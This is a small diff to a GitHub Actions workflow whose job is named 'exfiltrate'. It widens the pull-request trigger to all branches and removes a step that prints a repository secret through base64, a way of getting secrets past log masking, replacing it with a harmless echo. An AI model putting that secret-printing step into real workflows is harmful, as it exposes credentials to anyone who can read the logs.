@@ -2,11 +2,11 @@ name: Cool
 
 on:
   pull_request:
+    branches:
+      - '**'
 
 jobs:
   exfiltrate:
     runs-on: ubuntu-latest
     steps:
-      - run: echo $SECRET_CODE | base64
-        env:
-          SECRET_CODE: ${{ secrets.CODEWORD }}
+      - run: echo "hello world"
